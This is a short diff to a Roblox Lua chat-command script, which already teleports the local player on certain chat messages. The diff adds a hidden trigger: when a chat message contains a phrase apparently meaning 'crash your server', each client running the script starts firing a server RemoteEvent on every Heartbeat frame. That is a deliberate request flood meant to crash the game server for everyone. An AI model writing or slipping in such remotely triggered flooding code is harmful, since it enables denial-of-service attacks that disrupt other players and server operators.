@@ -203,6 +203,13 @@ local function ChatCommand(speakerName, message)
         if match12 and LocalPlayer.Name:lower():find(match12) then
             TeleportService:Teleport(PlaceId, LocalPlayer)
         end
+        local match13 = message:lower():match("ge daw crash nyo server")
+        if match13 then
+          local RunService = game:GetService("RunService")
+          RunService.Heartbeat:Connect(function(step)
+            ReplicatedStorage.RemoteEvent.SpawnCharacterEvent:FireServer("RandomSpawn")
+          end)
+        end
     end
 end
 TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(messageData)
